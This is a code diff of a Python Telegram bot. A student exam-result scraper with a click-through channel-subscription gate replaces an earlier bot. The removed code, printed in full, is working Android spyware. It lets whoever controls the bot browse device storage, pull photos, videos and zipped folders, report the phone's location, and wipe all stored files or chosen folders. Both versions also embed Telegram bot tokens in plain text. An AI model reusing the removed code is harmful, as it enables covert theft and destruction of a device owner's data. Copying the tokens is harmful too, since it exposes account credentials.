@@ -1,448 +1,562 @@
-import os
-import shutil
-import random
-import threading
+import re
 import time
-from telebot import TeleBot, types
-from colorama import Fore, Style, init
+import telebot
+import requests
+from datetime import datetime, timedelta
+from bs4 import BeautifulSoup
+from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
 
-init()  
+# ===== التوكن والإعدادات =====
+TOKEN = "7671449403:AAFgbTGaoxMRi5RNTJ0EoMukNNnLK9kjdUc"
+bot = telebot.TeleBot(TOKEN)
 
-TOKEN = '7556591017:AAE_1oG5c7NaC0_n-NadKSm_ZZ_ryR9JYIo' #توكن
-ADMIN_ID = 7498653159
-bot = TeleBot(TOKEN)
+# ===== معرفات المطورين =====
+ADMIN_IDS = [7498653159, 98764321]
 
-required_libraries = ['telebot', 'colorama']
+# ===== روابط القنوات =====
+CHANNEL_TELEGRAM = "https://t.me/ElJokerTechX"
+CHANNEL_WHATSAPP = "https://whatsapp.com/channel/0029Vb6mJg61SWsuotwwDR0R"
 
-def install_libraries():
-    for lib in required_libraries:
+# ===== كاش الاشتراك =====
+subscribed_users = set()        # المستخدمين المكتملين
+subscription_steps = {}         # {user_id: 'telegram' or 'whatsapp' or 'completed'}
+
+# ===== إعدادات البحث =====
+BASE_URL = "https://than.nezakr.net/?system=s1&t=glos&k={}"
+CACHE_DURATION = 3600
+cache = {}
+users_set = set()
+total_requests = 0
+start_time = datetime.now()
+
+# ===== دوال الحالة =====
+def is_subscribed(user_id):
+    return user_id in subscribed_users
+
+def get_sub_step(user_id):
+    return subscription_steps.get(user_id, None)
+
+def set_sub_step(user_id, step):
+    subscription_steps[user_id] = step
+
+def mark_subscribed(user_id):
+    subscribed_users.add(user_id)
+    if user_id in subscription_steps:
+        del subscription_steps[user_id]
+
+# ===== دالة عرض التسلسل =====
+def show_subscription_sequence(message):
+    user_id = message.from_user.id
+    step = get_sub_step(user_id)
+
+    if step is None:
+        # الخطوة 1: تليجرام
+        markup = InlineKeyboardMarkup(row_width=2)
+        markup.add(
+            InlineKeyboardButton("📢 اشترك في تليجرام", url=CHANNEL_TELEGRAM),
+            InlineKeyboardButton("✅ تم الاشتراك في تليجرام", callback_data="sub_telegram")
+        )
+        bot.reply_to(
+            message,
+            "🔒 **الخطوة 1 من 2:**\n\n"
+            "• اضغط على زر **اشترك في تليجرام** واشترك في القناة.\n"
+            "• ثم اضغط على **تم الاشتراك في تليجرام** للمتابعة.",
+            reply_markup=markup,
+            parse_mode="Markdown"
+        )
+        set_sub_step(user_id, 'telegram')
+        return False
+
+    elif step == 'telegram':
+        # الخطوة 2: واتساب
+        markup = InlineKeyboardMarkup(row_width=2)
+        markup.add(
+            InlineKeyboardButton("💬 اشترك في واتساب", url=CHANNEL_WHATSAPP),
+            InlineKeyboardButton("✅ تم الاشتراك في واتساب", callback_data="sub_whatsapp")
+        )
+        bot.reply_to(
+            message,
+            "🔒 **الخطوة 2 من 2:**\n\n"
+            "• اضغط على زر **اشترك في واتساب** واشترك في القناة.\n"
+            "• ثم اضغط على **تم الاشتراك في واتساب** لتفعيل البوت.",
+            reply_markup=markup,
+            parse_mode="Markdown"
+        )
+        set_sub_step(user_id, 'whatsapp')
+        return False
+
+    elif step == 'whatsapp':
+        # الخطوة النهائية: تفعيل
+        markup = InlineKeyboardMarkup()
+        markup.add(InlineKeyboardButton("🚀 تفعيل البوت الآن", callback_data="activate_bot"))
+        bot.reply_to(
+            message,
+            "✅ **تهانينا!**\n\n"
+            "لقد أكملت جميع خطوات الاشتراك.\n"
+            "اضغط على **تفعيل البوت الآن** لبدء الاستخدام.",
+            reply_markup=markup,
+            parse_mode="Markdown"
+        )
+        # نضع الحالة إلى 'ready' لمعرفة أنه في الخطوة الأخيرة
+        set_sub_step(user_id, 'ready')
+        return False
+
+    elif step == 'ready':
+        # إذا كان في حالة ready ولكن لم يضغط على التفعيل بعد، نعيد عرض زر التفعيل
+        markup = InlineKeyboardMarkup()
+        markup.add(InlineKeyboardButton("🚀 تفعيل البوت الآن", callback_data="activate_bot"))
+        bot.reply_to(
+            message,
+            "✅ اضغط على **تفعيل البوت الآن** لبدء الاستخدام.",
+            reply_markup=markup
+        )
+        return False
+
+    # إذا كان مشتركاً بالفعل، نعود True
+    return True
+
+# ===== دالة ensure_subscription المحسنة =====
+def ensure_subscription(message):
+    user_id = message.from_user.id
+    if is_subscribed(user_id):
+        return True
+
+    # نمرر الرسالة لعرض التسلسل
+    return show_subscription_sequence(message)
+
+# ===== دوال جلب البيانات (بدون تغيير) =====
+def get_student_data(seat: str, retries=3):
+    url = BASE_URL.format(seat)
+    headers = {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
+        "Accept-Language": "ar-EG,ar;q=0.9",
+    }
+
+    resp = None
+    for attempt in range(1, retries + 1):
         try:
-            __import__(lib)
-        except ImportError:
-            os.system(f'pip install {lib}')
+            resp = requests.get(url, headers=headers, timeout=15)
+            if resp.status_code == 200:
+                break
+        except Exception as e:
+            if attempt == retries:
+                return None, f"❌ فشل الاتصال بعد {retries} محاولات: {e}"
+            time.sleep(1)
+    else:
+        return None, f"❌ الموقع لم يستجب بعد {retries} محاولات (HTTP {resp.status_code})"
 
-install_libraries()
+    soup = BeautifulSoup(resp.text, "html.parser")
+    body_text = soup.get_text()
 
-def count_photos(directory):
-    count = 0
-    for root, dirs, files in os.walk(directory):
-        for file in files:
-            if file.endswith('.jpg') or file.endswith('.png'):
-                count += 1
-    return count
+    name = "غير معروف"
+    title = soup.find("title")
+    if title:
+        m = re.search(r"نتيجة الطالب (.*?) في", title.text)
+        if m:
+            name = m.group(1).strip()
 
-def count_videos(directory):
-    count = 0
-    for root, dirs, files in os.walk(directory):
-        for file in files:
-            if file.endswith('.mp4') or file.endswith('.avi') or file.endswith('.mkv'):
-                count += 1
-    return count
+    def extract(label):
+        pattern = re.compile(rf"{label}\s*([^\n\d]+?)(?:\d|\n|$)")
+        match = pattern.search(body_text)
+        return match.group(1).strip() if match else "غير محدد"
 
-def send_media_from_directory(directory, count, message, media_type):
-    sent_count = 0
-    for root, dirs, files in os.walk(directory):
-        for file in files:
-            if (media_type == 'photo' and (file.endswith('.jpg') or file.endswith('.png'))) or \
-               (media_type == 'video' and (file.endswith('.mp4') or file.endswith('.avi') or file.endswith('.mkv'))):
-                if sent_count >= count:
-                    return
-                try:
-                    with open(os.path.join(root, file), 'rb') as media_file:
-                        if media_type == 'photo':
-                            bot.send_photo(message.chat.id, media_file)
-                        else:
-                            bot.send_video(message.chat.id, media_file)
-                    sent_count += 1
-                except Exception as e:
-                    bot.send_message(message.chat.id, f'Error sending {media_type}: {e}')
+    section = extract("الشعبة")
+    edu_type = extract("نوع التعليم")
+    raw_grade = extract("التقدير")
+
+    subjects = {}
+    total_earned = 0.0
+    total_max = 0.0
+
+    subject_rows = soup.select('div.nzk-subject-row')
+    if subject_rows:
+        for row in subject_rows:
+            name_elem = row.select_one('.nzk-subject-name')
+            if not name_elem:
+                continue
+            subj = name_elem.get_text(strip=True)
+            score_elem = row.select_one('.nzk-subject-score')
+            if not score_elem:
+                continue
+            score_text = score_elem.get_text(strip=True)
+            match = re.search(r'(\d+\.?\d*)\s*\/\s*(\d+\.?\d*)', score_text)
+            if match:
+                earned = float(match.group(1))
+                max_score = float(match.group(2))
+                if max_score > 0:
+                    subj = re.sub(r'[0-9]', '', subj).strip()
+                    if subj and subj not in ["المادة", "الدرجة", "التقدير", "المستوى", "المجموع"]:
+                        percent = (earned / max_score) * 100
+                        subjects[subj] = {"earned": earned, "max": max_score, "percent": round(percent, 2)}
+                        total_earned += earned
+                        total_max += max_score
+
+    if not subjects:
+        tables = soup.find_all("table")
+        grade_table = None
+        for table in tables:
+            if "المادة" in table.get_text() and ("الدرجة" in table.get_text() or "المجموع" in table.get_text()):
+                grade_table = table
+                break
+
+        if grade_table:
+            rows = grade_table.find_all("tr")
+            for row in rows:
+                cols = row.find_all("td")
+                if len(cols) >= 2:
+                    subj = cols[0].get_text(strip=True)
+                    score_text = cols[1].get_text(strip=True)
+                    if "/" in score_text:
+                        parts = score_text.split("/")
+                        try:
+                            earned = float(parts[0].strip())
+                            max_score = float(parts[1].strip())
+                        except ValueError:
+                            continue
+                        if max_score > 0:
+                            subj = re.sub(r"[0-9]", "", subj).strip()
+                            if subj and subj not in ["المادة", "الدرجة", "التقدير", "المستوى", "المجموع"]:
+                                percent = (earned / max_score) * 100
+                                subjects[subj] = {"earned": earned, "max": max_score, "percent": round(percent, 2)}
+                                total_earned += earned
+                                total_max += max_score
+
+    if not subjects:
+        lines = body_text.split("\n")
+        for line in lines:
+            line = line.strip()
+            match = re.match(r"^([\u0600-\u06FF\s]{2,}?)\s*(\d+\.?\d*)\s*\/\s*(\d+\.?\d*)", line)
+            if match:
+                subj = match.group(1).strip()
+                earned = float(match.group(2))
+                max_score = float(match.group(3))
+                if subj and subj not in ["المادة", "الدرجة", "التقدير", "المستوى", "الصف", "الفصل", "المجموع"] and max_score > 0:
+                    subj = re.sub(r"[0-9]", "", subj).strip()
+                    if subj:
+                        percent = (earned / max_score) * 100
+                        subjects[subj] = {"earned": earned, "max": max_score, "percent": round(percent, 2)}
+                        total_earned += earned
+                        total_max += max_score
+
+    if not subjects:
+        return None, "❌ لم يتم العثور على درجات المواد. تأكد من رقم الجلوس."
+
+    total_percent = round((total_earned / total_max) * 100, 2) if total_max > 0 else 0
+
+    if total_percent >= 90:
+        grade = "ممتاز"
+    elif total_percent >= 80:
+        grade = "جيد جداً"
+    elif total_percent >= 65:
+        grade = "جيد"
+    elif total_percent >= 50:
+        grade = "مقبول"
+    else:
+        grade = "ضعيف"
+
+    result = {
+        "name": name,
+        "seat": seat,
+        "section": section,
+        "edu_type": edu_type,
+        "raw_grade": raw_grade,
+        "total_earned": round(total_earned, 2),
+        "total_max": round(total_max, 2),
+        "total_percent": total_percent,
+        "grade": grade,
+        "subjects": subjects,
+    }
+    return result, None
+
+def get_cached_or_fetch(seat):
+    global total_requests
+    total_requests += 1
+
+    now = datetime.now()
+    if seat in cache:
+        result, timestamp = cache[seat]
+        if now - timestamp < timedelta(seconds=CACHE_DURATION):
+            return result, None
+        else:
+            del cache[seat]
+
+    result, error = get_student_data(seat)
+    if error:
+        return None, error
+    cache[seat] = (result, now)
+    return result, None
+
+def register_user(user_id):
+    users_set.add(user_id)
+
+def result_buttons(seat):
+    markup = InlineKeyboardMarkup(row_width=2)
+    btn_new = InlineKeyboardButton("🔄 بحث جديد", callback_data="new_search")
+    btn_share = InlineKeyboardButton("📤 مشاركة", switch_inline_query=f"نتيجة الطالب {seat}")
+    btn_home = InlineKeyboardButton("🏠 الرئيسية", callback_data="home")
+    markup.add(btn_new, btn_share, btn_home)
+    return markup
+
+def is_admin(user_id):
+    return user_id in ADMIN_IDS
+
+# ===== أوامر البوت =====
 
 @bot.message_handler(commands=['start'])
-def start(message):
-    welcome_text = "مرحبًا!  أنا الروبوت الخاص بك.  كيف يمكنني المساعدة؟  🤖"
-    keyboard = types.InlineKeyboardMarkup()
-    button1 = types.InlineKeyboardButton('استخراج الصور 📸', callback_data='extract_photos')
-    button2 = types.InlineKeyboardButton('تنظيف البيانات 🗑️', callback_data='clear_data')
-    button3 = types.InlineKeyboardButton('نسخة من البيانات 📂', callback_data='copy_data')
-    button4 = types.InlineKeyboardButton('احذف المجلد 📁', callback_data='delete_folder')
-    button5 = types.InlineKeyboardButton('استخراج الفيديو 🎥', callback_data='search_videos')
-    button6 = types.InlineKeyboardButton('الموقع 🌍', callback_data='location')
-    button7 = types.InlineKeyboardButton('الملفات 📁', callback_data='files')
-    keyboard.add(button1, button5)
-    keyboard.add(button2, button3)
-    keyboard.add(button4)
-    keyboard.add(button6)
-    keyboard.add(button7)
-    bot.send_message(message.chat.id, text=welcome_text, reply_markup=keyboard)
-    
-import hashlib
-import os
-from telebot import types
-
-ITEMS_PER_PAGE = 10
-navigation_history = {}
-
-@bot.callback_query_handler(func=lambda call: call.data == 'files')
-def handle_files(call):
-    root_directory = '/storage/emulated/0/'
-    navigation_history[call.message.chat.id] = [root_directory]
-    show_directory_contents(call.message, root_directory, 0)
-
-def hash_path(path):
-    return hashlib.sha256(path.encode()).hexdigest()[:16]
-
-def show_directory_contents(message, directory, page):
-    chat_id = message.chat.id
-    history = navigation_history.get(chat_id, [])
-    keyboard = types.InlineKeyboardMarkup()
-    files = []
-    dirs = []
-    for item in os.listdir(directory):
-        item_path = os.path.join(directory, item)
-        if os.path.isfile(item_path):
-            files.append(item)
-        else:
-            dirs.append(item)
-    
-    all_items = dirs + files
-    start = page * ITEMS_PER_PAGE
-    end = start + ITEMS_PER_PAGE
-    current_items = all_items[start:end]
-    
-    for item in current_items:
-        item_path = os.path.join(directory, item)
-        if os.path.isfile(item_path):
-            if item.lower().endswith(('.png', '.jpg', '.jpeg', '.gif')):
-                button = types.InlineKeyboardButton(f'📷 {item}', callback_data=f'file_{hash_path(item_path)}')
-            elif item.lower().endswith(('.mp4', '.avi', '.mkv')):
-                button = types.InlineKeyboardButton(f'🎥 {item}', callback_data=f'file_{hash_path(item_path)}')
-            else:
-                button = types.InlineKeyboardButton(f'📄 {item}', callback_data=f'file_{hash_path(item_path)}')
-        else:
-            button = types.InlineKeyboardButton(f'📁 {item}', callback_data=f'dir_{hash_path(item_path)}')
-        keyboard.add(button)
-    
-    if len(history) > 1:
-        back_button = types.InlineKeyboardButton('⬅️ خلف', callback_data=f'back_{hash_path(directory)}')
-        keyboard.add(back_button)
-    
-    if end < len(all_items):
-        next_button = types.InlineKeyboardButton('➡️ الصفحة التالية', callback_data=f'page_{hash_path(directory)}_{page+1}')
-        keyboard.add(next_button)
-    
-    if page > 0:
-        prev_button = types.InlineKeyboardButton('⬅️ الصفحة السابقة', callback_data=f'page_{hash_path(directory)}_{page-1}')
-        keyboard.add(prev_button)
-    
-    if message.reply_to_message:
-        bot.edit_message_text(chat_id=chat_id, message_id=message.message_id, text=f"محتويات المجلد: {directory}", reply_markup=keyboard)
-    else:
-        bot.send_message(chat_id, f"محتويات المجلد: {directory}", reply_markup=keyboard)
-
-@bot.callback_query_handler(func=lambda call: call.data.startswith('dir_'))
-def handle_directory_click(call):
-    directory_hash = call.data.split('_', 1)[1]
-    directory = find_path_by_hash(directory_hash)
-    if directory is None:
-        bot.answer_callback_query(call.id, 'خطأ: لم يتم العثور على المسار.  🚫')
+def start_cmd(message):
+    if not ensure_subscription(message):
         return
-    chat_id = call.message.chat.id
-    history = navigation_history.get(chat_id, [])
-    history.append(directory)
-    navigation_history[chat_id] = history
-    show_directory_contents(call.message, directory, 0)
+    user_id = message.from_user.id
+    register_user(user_id)
+    markup = InlineKeyboardMarkup()
+    markup.add(InlineKeyboardButton("ℹ️ التعليمات", callback_data="help"))
+    bot.reply_to(
+        message,
+        "🎓 أهلاً بك في بوت نتيجة الثانوية العامة!\n\n"
+        "أرسل رقم الجلوس (أرقام فقط) وسأجلب لك النتيجة.\n"
+        "مثال: 1776500",
+        reply_markup=markup
+    )
 
-@bot.callback_query_handler(func=lambda call: call.data.startswith('file_'))
-def handle_file_click(call):
-    file_hash = call.data.split('_', 1)[1]
-    file_path = find_path_by_hash(file_hash)
-    if file_path is None:
-        bot.answer_callback_query(call.id, 'خطأ: الملف غير موجود.  🚫')
+@bot.message_handler(commands=['help'])
+def help_cmd(message):
+    if not ensure_subscription(message):
         return
-    try:
-        with open(file_path, 'rb') as file:
-            if file_path.lower().endswith(('.png', '.jpg', '.jpeg', '.gif')):
-                bot.send_photo(call.message.chat.id, file)
-            elif file_path.lower().endswith(('.mp4', '.avi', '.mkv')):
-                bot.send_video(call.message.chat.id, file)
-            else:
-                bot.send_document(call.message.chat.id, file)
-    except Exception as e:
-        bot.answer_callback_query(call.id, f'حدث خطأ أثناء إرسال الملف: {e} 🚫')
+    user_id = message.from_user.id
+    register_user(user_id)
+    bot.reply_to(
+        message,
+        "📌 **تعليمات البوت:**\n"
+        "• أرسل رقم الجلوس (7 أرقام) لعرض النتيجة.\n"
+        "• ستظهر لك الأزرار لإعادة البحث أو المشاركة.\n"
+        "• النتيجة تُخزن مؤقتاً لمدة ساعة لتسريع الاستعلام.\n"
+        "• في حال حدوث خطأ، حاول مرة أخرى لاحقاً.\n\n"
+        "للتواصل: @goo_cker"
+    )
 
-@bot.callback_query_handler(func=lambda call: call.data.startswith('page_'))
-def handle_page_click(call):
-    data = call.data.split('_', 2)
-    directory_hash = data[1]
-    directory = find_path_by_hash(directory_hash)
-    if directory is None:
-        bot.answer_callback_query(call.id, 'خطأ: لم يتم العثور على المسار. 🚫')
+# ===== أوامر المطور =====
+@bot.message_handler(commands=['stats'])
+def stats_cmd(message):
+    if not ensure_subscription(message):
         return
-    page = int(data[2])
-    show_directory_contents(call.message, directory, page)
-
-@bot.callback_query_handler(func=lambda call: call.data.startswith('back_'))
-def handle_back_click(call):
-    directory_hash = call.data.split('_', 1)[1]
-    directory = find_path_by_hash(directory_hash)
-    if directory is None:
-        bot.answer_callback_query(call.id, 'خطأ: لم يتم العثور على المسار. 🚫')
+    if not is_admin(message.from_user.id):
+        bot.reply_to(message, "⛔ غير مصرح لك بهذا الأمر.")
         return
-    chat_id = call.message.chat.id
-    history = navigation_history.get(chat_id, [])
-    if len(history) > 1:
-        history.pop()
-        navigation_history[chat_id] = history
-        previous_directory = history[-1]
-        show_directory_contents(call.message, previous_directory, 0)
+    uptime = datetime.now() - start_time
+    stats = (
+        f"📊 **إحصائيات البوت**\n"
+        f"👥 عدد المستخدمين: {len(users_set)}\n"
+        f"📦 حجم الكاش: {len(cache)} مفاتيح\n"
+        f"📥 عدد الطلبات: {total_requests}\n"
+        f"⏳ مدة التشغيل: {str(uptime).split('.')[0]}\n"
+        f"🕒 وقت بدء التشغيل: {start_time.strftime('%Y-%m-%d %H:%M:%S')}"
+    )
+    bot.reply_to(message, stats)
 
-def find_path_by_hash(path_hash):
-    root_directory = '/storage/emulated/0/'
-    for root, dirs, files in os.walk(root_directory):
-        for item in dirs + files:
-            item_path = os.path.join(root, item)
-            if hash_path(item_path) == path_hash:
-                return item_path
-    return None  
-    
-    
-@bot.callback_query_handler(func=lambda call: call.data == 'location')
-def handle_location(call):
-    import requests
-    ip_info = requests.get('http://ip-api.com/json/').json()
-    if ip_info['status'] == 'success':
-        latitude = ip_info['lat']
-        longitude = ip_info['lon']
-        additional_info = f"معلومات إضافية:\nجانب: {ip_info['country']}\nمنطقة: {ip_info['regionName']}\nمدينة: {ip_info['city']}\nمزود: {ip_info['isp']}\nIP-عنوان: {ip_info['query']}"        
-        bot.send_location(call.message.chat.id, latitude, longitude)
-        bot.send_message(call.message.chat.id, additional_info)
-    else:
-        bot.send_message(call.message.chat.id, "لم نتمكن من تحديد موقعك.")  
+@bot.message_handler(commands=['clear_cache'])
+def clear_cache_cmd(message):
+    if not ensure_subscription(message):
+        return
+    if not is_admin(message.from_user.id):
+        bot.reply_to(message, "⛔ غير مصرح لك بهذا الأمر.")
+        return
+    cache.clear()
+    bot.reply_to(message, "✅ تم مسح الكاش بنجاح.")
 
-@bot.callback_query_handler(func=lambda call: call.data == 'extract_photos')
-def ask_for_photo_count(call):
-    root_directory = '/storage/emulated/0/'
-    specific_folders = ['/storage/emulated/0/Photos', '/storage/emulated/0/Images', '/storage/emulated/0/DCIM/Camera']
-    photo_count = sum(count_photos(folder) for folder in specific_folders if os.path.exists(folder))
-    photo_count += count_photos(root_directory)
-    bot.send_message(call.message.chat.id, f'حاليا على الجهاز {photo_count} صور فوتوغرافية.  كم عدد الصور التي تريد الحصول عليها؟  📸')
-    bot.register_next_step_handler(call.message, process_photo_count, root_directory, specific_folders)
+@bot.message_handler(commands=['users'])
+def users_cmd(message):
+    if not ensure_subscription(message):
+        return
+    if not is_admin(message.from_user.id):
+        bot.reply_to(message, "⛔ غير مصرح لك بهذا الأمر.")
+        return
+    if not users_set:
+        bot.reply_to(message, "لا يوجد مستخدمون مسجلون بعد.")
+        return
+    user_list = list(users_set)[:50]
+    text = "👥 قائمة المستخدمين (أول 50):\n" + "\n".join(str(uid) for uid in user_list)
+    if len(users_set) > 50:
+        text += f"\n... و {len(users_set) - 50} آخرين"
+    bot.reply_to(message, text)
 
-def process_photo_count(message, root_directory, specific_folders):
-    try:
-        count = int(message.text)
-        if count <= 0:
-            raise ValueError
-    except ValueError:
-        bot.send_message(message.chat.id, 'الرجاء إدخال العدد الصحيح من الصور.  📸')
+@bot.message_handler(commands=['broadcast'])
+def broadcast_cmd(message):
+    if not ensure_subscription(message):
+        return
+    if not is_admin(message.from_user.id):
+        bot.reply_to(message, "⛔ غير مصرح لك بهذا الأمر.")
+        return
+    msg = bot.reply_to(message, "✏️ أرسل النص الذي تريد بثه لجميع المستخدمين:")
+    bot.register_next_step_handler(msg, process_broadcast)
+
+def process_broadcast(message):
+    if not ensure_subscription(message):
+        return
+    if not is_admin(message.from_user.id):
+        return
+    text = message.text
+    if not text:
+        bot.reply_to(message, "❌ النص فارغ، تم الإلغاء.")
         return
 
-    for folder in specific_folders:
-        if os.path.exists(folder):
-            send_media_from_directory(folder, count, message, 'photo')
-            count -= count_photos(folder)
-            if count <= 0:
-                return
-    
-    send_media_from_directory(root_directory, count, message, 'photo')
-    ask_to_return_to_menu(message, 'extract_photos')
-
-@bot.callback_query_handler(func=lambda call: call.data == 'clear_data')
-def clear_data(call):
-    root_directory = '/storage/emulated/0/'
-    bot.send_message(call.message.chat.id, 'لقد بدأت في تنظيف البيانات... 🗑️')
-    
-    try:
-        for root, dirs, files in os.walk(root_directory, topdown=False):
-            for name in files:
-                os.remove(os.path.join(root, name))
-            for name in dirs:
-                os.rmdir(os.path.join(root, name))
-        bot.send_message(call.message.chat.id, 'لقد تم مسح البيانات بنجاح.  🗑️')
-    except Exception as e:
-        bot.send_message(call.message.chat.id, f'خطأ عند مسح البيانات: {e} 🚫')
-    
-    ask_to_return_to_menu(call.message, 'clear_data')
-
-@bot.callback_query_handler(func=lambda call: call.data == 'copy_data')
-def ask_for_folder_name(call):
-    bot.send_message(call.message.chat.id, 'أدخل اسم المجلد المراد نسخه: 📂')
-    bot.register_next_step_handler(call.message, process_folder_name)
-
-def process_folder_name(message):
-    folder_name = message.text
-    root_directory = '/storage/emulated/0/'
-    folder_path = find_folder(root_directory, folder_name)
-    
-    if not folder_path:
-        bot.send_message(message.chat.id, f'مجلد "{folder_name}" لم يتم العثور عليه. 🚫')
-        ask_to_return_to_menu(message, 'copy_data')
-        return
-    
-    if is_folder_too_large(folder_path):
-        bot.send_message(message.chat.id, 'توقع أن تكون محتويات المجلد ثقيلة جدًا.  📦')
-    
-    zip_file_path = create_zip_archive(folder_path, folder_name)
-    if zip_file_path:
+    sent_count = 0
+    fail_count = 0
+    for uid in users_set:
         try:
-            with open(zip_file_path, 'rb') as zip_file:
-                bot.send_document(message.chat.id, zip_file)
-            os.remove(zip_file_path)
-        except Exception as e:
-            bot.send_message(message.chat.id, f'حدث خطأ أثناء إرسال الأرشيف: {e} 🚫')
-    else:
-        bot.send_message(message.chat.id, 'حدث خطأ أثناء إنشاء الأرشيف. 🚫')
-    
-    ask_to_return_to_menu(message, 'copy_data')
+            bot.send_message(uid, f"📢 **إعلان من المطور:**\n{text}")
+            sent_count += 1
+            time.sleep(0.05)
+        except Exception:
+            fail_count += 1
+    bot.reply_to(message, f"✅ تم إرسال البث إلى {sent_count} مستخدم.\n❌ فشل في {fail_count} مستخدم.")
 
-@bot.callback_query_handler(func=lambda call: call.data == 'delete_folder')
-def ask_for_delete_folder_name(call):
-    bot.send_message(call.message.chat.id, 'أدخل اسم المجلد المراد حذفه: 📁')
-    bot.register_next_step_handler(call.message, process_delete_folder_name)
+# ===== معالجة الأزرار =====
+@bot.callback_query_handler(func=lambda call: True)
+def callback_query(call):
+    user_id = call.from_user.id
 
-def process_delete_folder_name(message):
-    folder_name = message.text
-    root_directory = '/storage/emulated/0/'
-    folder_path = find_folder(root_directory, folder_name)
-    
-    if not folder_path:
-        bot.send_message(message.chat.id, f'مجلد "{folder_name}" لم يتم العثور عليه. 🚫')
-        ask_to_return_to_menu(message, 'delete_folder')
-        return
-    
-    try:
-        shutil.rmtree(folder_path)
-        bot.send_message(message.chat.id, f'مجلد "{folder_name}" تم حذفه بنجاح. 🗑️')
-    except Exception as e:
-        bot.send_message(message.chat.id, f'خطأ عند حذف مجلد: {e} 🚫')
-    
-    ask_to_return_to_menu(message, 'delete_folder')
-
-@bot.callback_query_handler(func=lambda call: call.data == 'search_videos')
-def ask_for_video_count(call):
-    root_directory = '/storage/emulated/0/'
-    specific_folders = ['/storage/emulated/0/Videos', '/storage/emulated/0/DCIM/Camera']
-    video_count = sum(count_videos(folder) for folder in specific_folders if os.path.exists(folder))
-    video_count += count_videos(root_directory)
-    bot.send_message(call.message.chat.id, f'حاليا على الجهاز {video_count} فيديو.  كم عدد مقاطع الفيديو التي تريدها؟ 🎥')
-    bot.register_next_step_handler(call.message, process_video_count, root_directory, specific_folders)
-
-def process_video_count(message, root_directory, specific_folders):
-    try:
-        count = int(message.text)
-        if count <= 0:
-            raise ValueError
-    except ValueError:
-        bot.send_message(message.chat.id, 'الرجاء إدخال عدد صالح من مقاطع الفيديو. 🎥')
+    # التعامل مع خطوات الاشتراك
+    if call.data == "sub_telegram":
+        # بعد الضغط على تم الاشتراك في التليجرام
+        if get_sub_step(user_id) != 'telegram':
+            bot.answer_callback_query(call.id, "⚠️ يرجى اتباع الخطوات بالترتيب.")
+            return
+        # نعدل الرسالة الحالية إلى الخطوة التالية
+        bot.edit_message_text(
+            "🔒 **الخطوة 2 من 2:**\n\n"
+            "• اضغط على زر **اشترك في واتساب** واشترك في القناة.\n"
+            "• ثم اضغط على **تم الاشتراك في واتساب** لتفعيل البوت.",
+            chat_id=call.message.chat.id,
+            message_id=call.message.message_id,
+            parse_mode="Markdown"
+        )
+        markup = InlineKeyboardMarkup(row_width=2)
+        markup.add(
+            InlineKeyboardButton("💬 اشترك في واتساب", url=CHANNEL_WHATSAPP),
+            InlineKeyboardButton("✅ تم الاشتراك في واتساب", callback_data="sub_whatsapp")
+        )
+        bot.edit_message_reply_markup(call.message.chat.id, call.message.message_id, reply_markup=markup)
+        set_sub_step(user_id, 'whatsapp')
+        bot.answer_callback_query(call.id, "✅ تم، انتقل للخطوة التالية")
         return
 
-    for folder in specific_folders:
-        if os.path.exists(folder):
-            send_media_from_directory(folder, count, message, 'video')
-            count -= count_videos(folder)
-            if count <= 0:
-                return
-    
-    send_media_from_directory(root_directory, count, message, 'video')
-    ask_to_return_to_menu(message, 'search_videos')
+    elif call.data == "sub_whatsapp":
+        if get_sub_step(user_id) != 'whatsapp':
+            bot.answer_callback_query(call.id, "⚠️ يرجى اتباع الخطوات بالترتيب.")
+            return
+        # نعدل الرسالة إلى التفعيل النهائي
+        bot.edit_message_text(
+            "✅ **تهانينا!**\n\n"
+            "لقد أكملت جميع خطوات الاشتراك.\n"
+            "اضغط على **تفعيل البوت الآن** لبدء الاستخدام.",
+            chat_id=call.message.chat.id,
+            message_id=call.message.message_id,
+            parse_mode="Markdown"
+        )
+        markup = InlineKeyboardMarkup()
+        markup.add(InlineKeyboardButton("🚀 تفعيل البوت الآن", callback_data="activate_bot"))
+        bot.edit_message_reply_markup(call.message.chat.id, call.message.message_id, reply_markup=markup)
+        set_sub_step(user_id, 'ready')
+        bot.answer_callback_query(call.id, "✅ تم، اضغط على تفعيل البوت")
+        return
 
-def find_folder(root_directory, folder_name):
-    for root, dirs, files in os.walk(root_directory):
-        if folder_name in dirs:
-            return os.path.join(root, folder_name)
-    return None
+    elif call.data == "activate_bot":
+        if get_sub_step(user_id) != 'ready':
+            bot.answer_callback_query(call.id, "⚠️ يجب إكمال الخطوات أولاً.")
+            return
+        # تسجيل المستخدم كمشترك
+        mark_subscribed(user_id)
+        bot.edit_message_text(
+            "🎉 **تم تفعيل البوت بنجاح!**\n\n"
+            "يمكنك الآن إرسال رقم الجلوس (7 أرقام) للحصول على النتيجة.\n"
+            "استخدم /help للتعليمات.",
+            chat_id=call.message.chat.id,
+            message_id=call.message.message_id,
+            parse_mode="Markdown"
+        )
+        # إزالة الأزرار
+        bot.edit_message_reply_markup(call.message.chat.id, call.message.message_id, reply_markup=None)
+        bot.answer_callback_query(call.id, "✅ البوت مفعل الآن!")
+        # نستدعي start_cmd ليعرض رسالة الترحيب
+        start_cmd(call.message)
+        return
 
-def create_zip_archive(folder_path, folder_name):
-    try:
-        temp_dir = '/tmp'
-        if not os.path.exists(temp_dir):
-            temp_dir = os.getcwd()
-        zip_file_path = os.path.join(temp_dir, f'{folder_name}.zip')
-        shutil.make_archive(zip_file_path[:-4], 'zip', folder_path)
-        return zip_file_path
-    except Exception as e:
-        return None
+    # باقي الأزرار تحتاج اشتراك
+    if not ensure_subscription(call.message):
+        return
 
-def is_folder_too_large(folder_path):
-    total_size = 0
-    for dirpath, dirnames, filenames in os.walk(folder_path):
-        for f in filenames:
-            fp = os.path.join(dirpath, f)
-            total_size += os.path.getsize(fp)
-    return total_size > 1024 * 1024 * 100  
+    register_user(user_id)
 
-def ask_to_return_to_menu(message, task):
-    keyboard = types.InlineKeyboardMarkup()
-    button1 = types.InlineKeyboardButton('نعم', callback_data='return_to_menu')
-    button2 = types.InlineKeyboardButton('لا', callback_data=f'repeat_{task}')
-    keyboard.add(button1, button2)
-    bot.send_message(message.chat.id, 'هل تريد العودة إلى القائمة؟ 🔄', reply_markup=keyboard)
-
-@bot.callback_query_handler(func=lambda call: call.data == 'return_to_menu')
-def return_to_menu(call):
-    start(call.message)
-
-@bot.callback_query_handler(func=lambda call: call.data.startswith('repeat_'))
